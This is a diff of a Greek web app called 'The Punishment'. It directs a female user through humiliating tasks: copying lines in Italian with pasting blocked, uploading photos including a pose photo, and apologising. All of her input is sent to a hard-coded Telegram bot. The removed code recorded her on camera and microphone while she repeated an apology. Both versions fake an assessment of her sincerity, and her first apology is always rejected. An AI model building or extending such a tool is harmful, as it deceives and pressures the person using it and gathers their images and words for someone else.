@@ -57,22 +57,6 @@
         .btn-red { background: var(--accent-red); color: white; }
         .btn-green { background: var(--flag-green); color: white; }
         
-        /* NOSE BUTTON STYLES */
-        #noseVideo {
-            width: 100%; height: 180px; object-fit: cover; border-radius: 10px;
-            border: 2px solid #555; background: #000; margin-bottom: 10px; transform: scaleX(-1);
-        }
-        .nose-btn {
-            width: 120px; height: 120px; border-radius: 50%;
-            background: radial-gradient(circle, #ff5555, #990000);
-            border: 5px solid white; color: white; font-size: 1rem; font-weight: 900;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-            margin: 10px auto; display: flex; justify-content: center; align-items: center;
-            cursor: pointer; user-select: none; -webkit-touch-callout: none;
-            touch-action: manipulation; text-align: center; line-height: 1.2;
-        }
-        .nose-btn:active { transform: scale(0.9); border-color: #00ff00; background: radial-gradient(circle, #009900, #005500); }
-
         /* CORNER UI */
         #cornerUI {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -98,58 +82,26 @@
             font-family: inherit; resize: none; box-sizing: border-box; font-size: 1rem;
         }
         
-        /* Audio visualizer for nose */
-        #voiceIndicator {
-            width: 20px; height: 20px; border-radius: 50%; background: #333; 
-            display: inline-block; margin-left: 10px; border: 2px solid #555;
-        }
-
     </style>
 </head>
 <body>
 
     <h1>Η ΤΙΜΩΡΙΑ ⚖️</h1>
 
-    <div id="infoPreNose" class="modal">
+    <div id="thankYouModal" class="modal" style="display: flex;">
         <div class="modal-content">
-            <h3>Βήμα 1: ΠΕΙΘΑΡΧΙΑ</h3>
-            <p class="info-text">"Για τιμωρία θα πατήσεις το κουμπί με τη <strong>ΜΥΤΗ</strong> σου για 15 δευτερόλεπτα και θα λες 'Συγγνώμη που ήμουν άτακτη και ανυπάκουη'. Θα κρατηθεί σε βίντεο για να θυμάσαι τι έκανες."</p>
-            <p class="info-text" style="color:var(--accent-red);">
-                <strong>ΠΡΟΣΟΧΗ:</strong><br>
-                1. Μην σηκώσεις τη μύτη σου.<br>
-                2. Ταυτόχρονα πρέπει να λες ΔΥΝΑΤΑ:<br>
-                <em>"Συγγνώμη που ήμουν άτακτη και ανυπάκουη"</em><br>
-                Αν σταματήσεις να μιλάς, χάνεις!
-            </p>
-            <button class="btn btn-red" onclick="initNoseStage()">Είμαι έτοιμη</button>
-        </div>
-    </div>
-
-    <div id="noseModal" class="modal">
-        <div class="modal-content">
-            <h2>ΔΟΚΙΜΑΣΙΑ ΜΥΤΗΣ</h2>
-            <video id="noseVideo" autoplay playsinline muted></video>
-            
-            <div style="display:flex; align-items:center; justify-content:center; margin:10px;">
-                <div id="noseTimer" style="font-size:2.5rem; font-weight:900; color:var(--accent-red);">15.0</div>
-                <div id="voiceIndicator"></div>
-            </div>
-            
-            <div class="nose-btn" id="noseBtn" 
-                 onmousedown="startNoseHold()" onmouseup="endNoseHold()" 
-                 ontouchstart="startNoseHold(event)" ontouchend="endNoseHold(event)">
-                ΠΑΤΑ ΜΕ ΤΗ ΜΥΤΗ
-            </div>
-            <p id="noseMsg" style="font-size:0.8rem; color:#aaa; margin-top:10px;">
-                Κράτα & Μίλα: "Συγγνώμη που ήμουν άτακτη και ανυπάκουη"
-            </p>
+            <div style="font-size: 3rem;">🎁</div>
+            <h2>ΤΙ ΛΕΜΕ ΠΟΥ ΜΕΙΩΘΗΚΕ Η ΤΙΜΩΡΙΑ;;</h2>
+            <p>Γράψε την απάντηση για να ξεκινήσεις.</p>
+            <textarea id="thankYouInput" placeholder="..."></textarea>
+            <button class="btn btn-green" onclick="submitThankYou()">Αποστολή</button>
         </div>
     </div>
 
     <div id="infoPreWrite" class="modal">
         <div class="modal-content">
             <h3>Βήμα 2</h3>
-            <p class="info-text">"Συνεχίζουμε. Πρέπει να γράψεις την πρόταση <strong>Sarò una brava ragazza quest'anno</strong>."</p>
+            <p class="info-text">"Συνεχίζουμε. Θα γράψεις 'Θα είμαι καλό κορίτσι τη νέα χρονιά' για να το εμπεδώσεις, αλλά επειδή τα πιάνεις καλύτερα θα το γράψεις στα ιταλικά! Άρα, πρέπει να γράψεις την πρόταση <strong>Sarò una brava ragazza quest'anno</strong>."</p>
             <button class="btn" onclick="startHandwriting()">Συνέχεια</button>
         </div>
     </div>
@@ -175,11 +127,11 @@
             </div>
 
             <div id="writeDigital" style="display:none;">
-                <p>Γράψε (χωρίς να κλέψεις!) <strong>10 φορές</strong>:</p>
+                <p>Γράψε τη μία κάτω από την άλλη (χωρίς να κλέψεις!) <strong>10 φορές</strong>:</p>
                 <div style="background:#333; padding:5px; border-radius:10px; margin-bottom:10px; color:#00ff00; font-family:monospace; font-size:0.8rem;">
                     Sarò una brava ragazza quest'anno
                 </div>
-                <textarea id="digitalInput" rows="10" placeholder="1. Sarò... 2. Sarò..." onpaste="handlePaste(event)"></textarea>
+                <textarea id="digitalInput" rows="10" placeholder="Το γράφεις μία, μετά από κάτω κλπ" onpaste="handlePaste(event)"></textarea>
                 <button class="btn btn-red" onclick="submitDigital()">Αποστολή</button>
             </div>
 
@@ -209,12 +161,9 @@
     <div id="apologyModal" class="modal">
         <div class="modal-content">
             <h2>ΤΕΛΙΚΟΣ ΕΛΕΓΧΟΣ</h2>
-            <p>Στείλε φωνητικό να δείξεις ότι έμαθες και ζήτα ευγενικά να βγεις από την τιμωρία στη γωνία. Θα αξιολογηθεί αν ακούστηκες αρκετά ειλικρινής και φρόνιμη.</p>
-            <button class="btn" id="apologyRecBtn" onmousedown="startApologyRec()" onmouseup="stopApologyRec()" ontouchstart="startApologyRec()" ontouchend="stopApologyRec()">🎙️ Κράτα πατημένο και άσε στο τέλος</button>
-            <div id="analysisUI" style="display:none; margin-top:20px;">
-                <p style="color:#00ff00; font-family:monospace; font-size:0.8rem;">Ανάλυση ειλικρίνειας...</p>
-                <div class="progress-container"><div class="progress-bar" id="apologyBar"></div></div>
-            </div>
+            <p>Γράψε μια ειλικρινή συγγνώμη και ζήτα ευγενικά να βγεις από την τιμωρία. Θα αξιολογηθεί το κείμενό σου.</p>
+            <textarea id="apologyInput" placeholder="Γράψε εδώ..." rows="4"></textarea>
+            <button class="btn btn-green" onclick="submitApology()">Υποβολή</button>
         </div>
     </div>
 
@@ -222,8 +171,8 @@
         <div class="modal-content">
             <div style="font-size:3rem;">🤨</div>
             <h2>ΔΕΝ ΕΠΕΙΣΕΣ</h2>
-            <p>Ο τόνος της φωνής σου έδειξε <strong>ειρωνεία και υφάκι</strong>.</p>
-            <p>Άρα θα κάτσεις άλλο <strong>1 λεπτό</strong> στη γωνία για να κοπούν τελείως αυτά. Φρόντισε αυτή τη φορά να ακουστείς πιο ταπεινή!</p>
+            <p>Από τα γραφόμενά σου, <strong>δεν φαίνεσαι αρκετά ταπεινή</strong>.</p>
+            <p>Θα κάτσεις άλλο <strong>1 λεπτό</strong> στη γωνία. Φρόντισε αυτή τη φορά να γράψεις κάτι καλύτερο!</p>
             <button class="btn btn-red" onclick="startExtraCorner()">Πίσω στη Γωνία</button>
         </div>
     </div>
@@ -245,11 +194,6 @@
         const CHAT_ID = '7336951445';    
         // ==========================================
 
-        // Start directly with the Nose Info Modal
-        document.addEventListener("DOMContentLoaded", function() {
-            document.getElementById('infoPreNose').style.display = 'flex';
-        });
-
         // --- HELPER FOR NOTIFICATIONS ---
         function sendTelegramNotification(text) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -259,15 +203,34 @@
             });
         }
 
+        // --- STEP 1: THANK YOU ---
+        function submitThankYou() {
+            const txt = document.getElementById('thankYouInput').value;
+            if(txt.length < 2) { alert("Γράψε κάτι!"); return; }
+            
+            const msg = `🙏 *Απάντηση 'Τι λέμε':*\n"${txt}"`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            }).then(() => {
+                document.getElementById('thankYouModal').style.display = 'none';
+                document.getElementById('infoPreWrite').style.display = 'flex';
+            });
+        }
+
         // --- IMAGE UPLOADER ---
         function compressAndUpload(inputId, caption, successCallback) {
             const input = document.getElementById(inputId);
+            const statusId = inputId === 'photoInput' ? 'photoStatus' : 'poseStatus';
+            const status = document.getElementById(statusId);
             const btn = document.querySelector(`#${inputId}`).nextElementSibling;
 
             if(input.files.length === 0) { alert("Βγάλε φώτο!"); return; }
 
             const originalBtnText = btn.innerText;
             btn.innerText = "Συμπίεση..."; btn.disabled = true;
+            status.innerText = "Επεξεργασία εικόνας...";
 
             const file = input.files[0];
             const reader = new FileReader();
@@ -288,6 +251,7 @@
 
                     canvas.toBlob((blob) => {
                         btn.innerText = "Αποστολή...";
+                        status.innerText = "Ανέβασμα...";
                         
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
@@ -301,6 +265,7 @@
                         .then(res => res.json())
                         .then(data => {
                             if(data.ok) {
+                                status.innerText = "Εστάλη! ✅";
                                 setTimeout(successCallback, 1000);
                             } else {
                                 alert("Telegram Error: " + data.description);
@@ -316,123 +281,7 @@
             }
         }
 
-        // --- STAGE 4: NOSE CHALLENGE ---
-        let noseStream = null;
-        let noseRecorder = null;
-        let noseChunks = [];
-        let noseTimer = 15.0;
-        let noseInterval;
-        let noseActive = false;
-        let audioContext, analyser, microphone, dataArray;
-        let silenceCounter = 0;
-
-        function initNoseStage() {
-            document.getElementById('infoPreNose').style.display = 'none';
-            document.getElementById('noseModal').style.display = 'flex';
-            
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-            .then(stream => {
-                noseStream = stream;
-                document.getElementById('noseVideo').srcObject = stream;
-                audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                analyser = audioContext.createAnalyser();
-                microphone = audioContext.createMediaStreamSource(stream);
-                microphone.connect(analyser);
-                analyser.fftSize = 256;
-                dataArray = new Uint8Array(analyser.frequencyBinCount);
-            })
-            .catch(err => alert("Need Camera & Mic!"));
-        }
-
-        function startNoseHold(e) {
-            if(e && e.type === 'touchstart') e.preventDefault();
-            if(noseActive) return;
-            
-            noseActive = true;
-            noseTimer = 15.0;
-            silenceCounter = 0;
-            
-            document.getElementById('noseBtn').style.transform = "scale(0.9)";
-            document.getElementById('noseBtn').style.background = "radial-gradient(circle, #009900, #005500)";
-            document.getElementById('noseMsg').innerText = "ΜΙΛΑ! 'Συγγνώμη που ήμουν άτακτη...'";
-
-            noseChunks = [];
-            noseRecorder = new MediaRecorder(noseStream);
-            noseRecorder.addEventListener("dataavailable", e => noseChunks.push(e.data));
-            noseRecorder.start();
-
-            if(noseInterval) clearInterval(noseInterval);
-            noseInterval = setInterval(() => {
-                noseTimer -= 0.1;
-                document.getElementById('noseTimer').innerText = noseTimer.toFixed(1);
-                
-                analyser.getByteFrequencyData(dataArray);
-                let sum = 0;
-                for(let i=0; i<dataArray.length; i++) sum += dataArray[i];
-                let average = sum / dataArray.length;
-                
-                const ind = document.getElementById('voiceIndicator');
-                if(average > 10) ind.style.background = "#00ff00";
-                else ind.style.background = "#333";
-
-                if(average < 10) {
-                    silenceCounter++;
-                    if(silenceCounter > 15) failNose("ΔΕΝ ΑΚΟΥΓΕΣΑΙ! ΠΡΕΠΕΙ ΝΑ ΜΙΛΑΣ!");
-                } else {
-                    silenceCounter = 0;
-                }
-                
-                if(noseTimer <= 0) finishNoseSuccess();
-            }, 100);
-        }
-
-        function endNoseHold(e) {
-            if(e && e.type === 'touchend') e.preventDefault();
-            if(!noseActive) return; 
-            failNose("Σήκωσες τη μύτη! Κλέβεις!");
-        }
-
-        function failNose(msg) {
-            noseActive = false;
-            clearInterval(noseInterval);
-            if(noseRecorder && noseRecorder.state === "recording") noseRecorder.stop();
-            document.getElementById('noseBtn').style.transform = "scale(1)";
-            document.getElementById('noseBtn').style.background = "radial-gradient(circle, #ff5555, #990000)";
-            document.getElementById('noseMsg').innerText = "Απέτυχες!";
-            document.getElementById('noseTimer').innerText = "FAIL";
-            alert(msg + " Ξανά από την αρχή!");
-            noseTimer = 15.0;
-            document.getElementById('noseTimer').innerText = "15.0";
-        }
-
-        function finishNoseSuccess() {
-            noseActive = false;
-            clearInterval(noseInterval);
-            noseRecorder.stop();
-            document.getElementById('noseBtn').style.pointerEvents = "none";
-            document.getElementById('noseMsg').innerText = "ΕΠΙΤΥΧΙΑ! Ανέβασμα...";
-            
-            noseRecorder.addEventListener("stop", () => {
-                const blob = new Blob(noseChunks, { type: 'video/webm' });
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob);
-                formData.append('caption', '👃 Δοκιμασία Μύτης + Ήχος (Video)');
-                
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData })
-                .then(res => res.json())
-                .then(data => {
-                    if(noseStream) noseStream.getTracks().forEach(track => track.stop());
-                    setTimeout(() => {
-                        document.getElementById('noseModal').style.display = 'none';
-                        document.getElementById('infoPreWrite').style.display = 'flex';
-                    }, 1000);
-                })
-                .catch(err => alert("Video Upload Error"));
-            });
-        }
-
-        // --- STAGE 5: HANDWRITING ---
+        // --- STAGE 2: HANDWRITING ---
         function startHandwriting() {
             document.getElementById('infoPreWrite').style.display = 'none';
             document.getElementById('handwritingModal').style.display = 'flex';
@@ -460,7 +309,6 @@
 
         function submitDigital() {
             const text = document.getElementById('digitalInput').value;
-            // Basic length check (phrase ~30 chars * 10 = 300) - lenient check > 100
             if(text.length < 100) { alert("Δεν το έγραψες 10 φορές! Μην κλέβεις!"); return; }
             
             const msg = `📝 *Τιμωρία Γραφής (Κινητό):*\n${text}`;
@@ -535,60 +383,30 @@
             document.getElementById('apologyModal').style.display = 'flex';
         }
 
-        // --- APOLOGY ---
-        let apolRecorder;
-        let apolChunks = [];
+        // --- APOLOGY (TEXT) ---
+        function submitApology() {
+            const txt = document.getElementById('apologyInput').value;
+            if(txt.length < 5) { alert("Γράψε κάτι παραπάνω!"); return; }
 
-        async function startApologyRec() {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
-                apolRecorder = new MediaRecorder(s);
-                apolChunks = [];
-                apolRecorder.addEventListener("dataavailable", e => apolChunks.push(e.data));
-                apolRecorder.start();
-                document.getElementById('apologyRecBtn').style.background = 'red';
-            } catch(e) { alert("Mic Error"); }
-        }
+            const cap = servedExtra ? "Τελική Συγγνώμη (Δεκτή)" : "Πρώτη Συγγνώμη (Απορρίφθηκε)";
+            const msg = `🥺 *${cap}:*\n"${txt}"`;
 
-        function stopApologyRec() {
-            if(!apolRecorder) return;
-            apolRecorder.stop();
-            document.getElementById('apologyRecBtn').style.background = 'white';
-            
-            apolRecorder.addEventListener("stop", () => {
-                const blob = new Blob(apolChunks, { type: 'audio/ogg' });
-                document.getElementById('analysisUI').style.display = 'block';
-                document.getElementById('apologyBar').style.width = '100%';
-                const cap = servedExtra ? "Τελική Συγγνώμη (Δεκτή)" : "Πρώτη Συγγνώμη (Απορρίφθηκε)";
-                sendVoice(blob, cap, () => {
-                    setTimeout(handleApologyResult, 2000);
-                });
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            }).then(() => {
+                 document.getElementById('apologyModal').style.display = 'none';
+                 // Clean input for next time
+                 document.getElementById('apologyInput').value = "";
+                 
+                 if(!servedExtra) {
+                    document.getElementById('extraTimeModal').style.display = 'flex';
+                    servedExtra = true;
+                 } else {
+                    document.getElementById('successModal').style.display = 'flex';
+                 }
             });
-        }
-
-        function sendVoice(blob, caption, callback) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('voice', blob);
-            formData.append('caption', caption);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData })
-            .then(res => res.json())
-            .then(data => {
-                if(data.ok) callback();
-                else alert("Telegram Error: " + data.description);
-            });
-        }
-
-        function handleApologyResult() {
-            document.getElementById('apologyModal').style.display = 'none';
-            document.getElementById('analysisUI').style.display = 'none';
-            document.getElementById('apologyBar').style.width = '0%';
-            if(!servedExtra) {
-                document.getElementById('extraTimeModal').style.display = 'flex';
-                servedExtra = true;
-            } else {
-                document.getElementById('successModal').style.display = 'flex';
-            }
         }
 
         function startExtraCorner() {
